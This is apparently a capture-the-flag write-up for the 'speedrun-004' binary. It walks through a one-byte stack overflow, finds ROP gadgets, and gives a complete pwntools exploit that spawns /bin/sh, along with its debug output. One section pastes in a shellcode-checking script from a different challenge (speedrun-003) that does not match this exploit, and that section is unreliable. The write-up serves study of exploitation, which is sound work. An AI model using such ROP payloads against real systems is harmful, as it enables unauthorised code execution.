# &#35; speedrun-004

#### &#42; files
```bash
## 1 file
$ ls
speedrun-004


$ file speedrun-004
speedrun-004: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3633fdca0065d9365b3f0c0237c7785c2c7ead8f, stripped
$ checksec --file=./speedrun-004
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		0	./speedrun-004

```

#### &#42; execute
```bash
## just input, not echo
$ ./speedrun-004
i think i'm getting better at this coding thing.
how much do you have to say?
aaaa
That's not much to say.
see ya later slowpoke.

```

#### &#42; reversing
```
void FUN_00400bd2(void)

{
  undefined local_16 [9];
  undefined local_d;
  int local_c;
  
  FUN_00410c30("how much do you have to say?");
  FUN_0044a140(0,local_16,9);
  local_d = 0;
  local_c = FUN_0040dd00(local_16);
  if (local_c < 1) {
    FUN_00410c30("That\'s not much to say.");
  }
  else {
    if (local_c < 258) {
      FUN_00400b73(local_c);
    }
    else {
      FUN_00410c30("That\'s too much to say!.");
    }
  }
  return;
}

## can input length = 257 (because of local_c < 258)

void FUN_00400b73(int param_1)

{
  undefined local_108 [256];
  
  local_108[0] = 0;
  FUN_00410c30("Ok, what do you have to say for yourself?");
  FUN_0044a140(0,local_108,(long)param_1);
  FUN_0040ffb0("Interesting thought \"%s\", I\'ll take it into consideration.\n",local_108);
  return;
}

## but because length of input buffer(local_108) is 256
## then here occurs 1 byte overflow

```


#### &#42; structure of stack
```
## retsled(nopsled)
## read(0, bss, &len("/bin/sh\x00")
## execve(bss("/bin/sh"), 0, 0)
## "\x00" => point to any where on retsled

```

#### &#42; payload(python)
```bash

gef➤  ropper --search "ret;"
0x0000000000400416: ret;

gef➤  ropper --search "pop rdi; ret"
0x0000000000400686: pop rdi; ret;

gef➤  ropper --search "pop rsi; ret"
0x0000000000410a93: pop rsi; ret;

gef➤  ropper --search "pop rdx; ret"
0x000000000041424a: pop rdx; ret 0xfffe;
0x000000000044c6b6: pop rdx; ret;

gef➤  ropper --search "pop rax; ret"
0x0000000000415f04: pop rax; ret;

gef➤  ropper --search "syscall; ret"
0x0000000000474f15: syscall; ret;

gef➤


ret = 0x400416
pop_rdi = 0x400686
pop_rsi = 0x410a93
pop_rdx = 0x44c6b6
pop_rax = 0x415f04
syscall = 0x474f15

## read(0, bss, 8)
gadgets  = p64(pop_rdi)		
gadgets += p64(0) 
gadgets += p64(pop_rsi)		
gadgets += p64(bss)
gadgets += p64(pop_rdx)		
gadgets += p64(8)
gadgets += p64(pop_rax)
gadgets += p64(0)
gadgets += p64(syscall_ret)

## execve(bss, 0, 0)
gadgets += p64(pop_rdi)		
gadgets += p64(bss)		
gadgets += p64(pop_rsi)		
gadgets += p64(0)			
gadgets += p64(pop_rdx)		
gadgets += p64(0)			
gadgets += p64(pop_rax)
gadgets += p64(59)
gadgets += p64(syscall_ret)

```


#### &#42; how to attack
```bash
## forward shellcode[15]^0xf
## and
## backward shellcode[15]^0xf
## must to same

$ cat chk-speedrun-003.py
shellcode="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xdd\xdd\xdd\xdd\xdd\xd2"
print ("shellcode len : %i" % len(shellcode))

result = 0
for ch in range(15):
	result ^= ord(shellcode[ch])
print ("forward : %i" % result)

result = 0
for ch in range(15, 30):
	result ^= ord(shellcode[ch])
print ("backward : %i" % result)

$ python chk-speedrun-003.py
shellcode len : 30
forward : 205
backward : 205

```


#### &#42; make exploit code
```bash
$ cat exp-speedrun-004.py
from pwn import *

context.log_level='debug'

filename = './speedrun-004'
elf=ELF(filename)
conn=process(filename)

bss = elf.get_section_by_name(".bss").header.sh_addr

print(".bss : "+hex(bss))

binsh='/bin/sh\x00'

ret = 0x400416
pop_rdi = 0x400686
pop_rsi = 0x410a93
pop_rdx = 0x44c6b6
pop_rax = 0x415f04
syscall = 0x474f15

## read(0, bss, 8)
gadgets  = p64(pop_rdi)
gadgets += p64(0)
gadgets += p64(pop_rsi)
gadgets += p64(bss)
gadgets += p64(pop_rdx)
gadgets += p64(8)
gadgets += p64(pop_rax)
gadgets += p64(0)
gadgets += p64(syscall)

## execve(bss, 0, 0)
gadgets += p64(pop_rdi)
gadgets += p64(bss)
gadgets += p64(pop_rsi)
gadgets += p64(0)
gadgets += p64(pop_rdx)
gadgets += p64(0)
gadgets += p64(pop_rax)
gadgets += p64(59)
gadgets += p64(syscall)


payload  = p64(ret) * int(256/8 - (len(gadgets)/8))
payload += gadgets
payload += b"\x00"

conn.recvuntil("how much do you have to say?\n")
conn.sendline("257")
conn.recvuntil("Ok, what do you have to say for yourself?\n")

conn.send(payload)
conn.send(binsh)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python exp-speedrun-004.py
[DEBUG] '/pwn/speedrun-2019/speedrun-004' is statically linked, skipping GOT/PLT symbols
[*] '/pwn/speedrun-2019/speedrun-004'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './speedrun-004' argv=[b'./speedrun-004'] : pid 62607
.bss : 0x6bb2e0
exp-speedrun-004.py:49: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil("how much do you have to say?\n")
[DEBUG] Received 0x4e bytes:
    b"i think i'm getting better at this coding thing.\n"
    b'how much do you have to say?\n'
exp-speedrun-004.py:50: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.sendline("257")
[DEBUG] Sent 0x4 bytes:
    b'257\n'
exp-speedrun-004.py:51: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil("Ok, what do you have to say for yourself?\n")
[DEBUG] Received 0x2a bytes:
    b'Ok, what do you have to say for yourself?\n'
[DEBUG] Sent 0x101 bytes:
    00000000  16 04 40 00  00 00 00 00  16 04 40 00  00 00 00 00  │··@·│····│··@·│····│
    *
    00000070  86 06 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00000080  93 0a 41 00  00 00 00 00  e0 b2 6b 00  00 00 00 00  │··A·│····│··k·│····│
    00000090  b6 c6 44 00  00 00 00 00  08 00 00 00  00 00 00 00  │··D·│····│····│····│
    000000a0  04 5f 41 00  00 00 00 00  00 00 00 00  00 00 00 00  │·_A·│····│····│····│
    000000b0  15 4f 47 00  00 00 00 00  86 06 40 00  00 00 00 00  │·OG·│····│··@·│····│
    000000c0  e0 b2 6b 00  00 00 00 00  93 0a 41 00  00 00 00 00  │··k·│····│··A·│····│
    000000d0  00 00 00 00  00 00 00 00  b6 c6 44 00  00 00 00 00  │····│····│··D·│····│
    000000e0  00 00 00 00  00 00 00 00  04 5f 41 00  00 00 00 00  │····│····│·_A·│····│
    000000f0  3b 00 00 00  00 00 00 00  15 4f 47 00  00 00 00 00  │;···│····│·OG·│····│
    00000100  00                                                  │·│
    00000101
exp-speedrun-004.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.send(binsh)
[DEBUG] Sent 0x8 bytes:
    00000000  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·│
    00000008
[*] Switching to interactive mode
[DEBUG] Received 0x3c bytes:
    00000000  49 6e 74 65  72 65 73 74  69 6e 67 20  74 68 6f 75  │Inte│rest│ing │thou│
    00000010  67 68 74 20  22 16 04 40  22 2c 20 49  27 6c 6c 20  │ght │"··@│", I│'ll │
    00000020  74 61 6b 65  20 69 74 20  69 6e 74 6f  20 63 6f 6e  │take│ it │into│ con│
    00000030  73 69 64 65  72 61 74 69  6f 6e 2e 0a               │side│rati│on.·│
    0000003c
Interesting thought "\x16@", I'll take it into consideration.
$
[DEBUG] Sent 0x1 bytes:
    10 * 0x1
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x1b bytes:
    b'getted flag successully!!!\n'
getted flag successully!!!
[*] Got EOF while reading in interactive
$

```
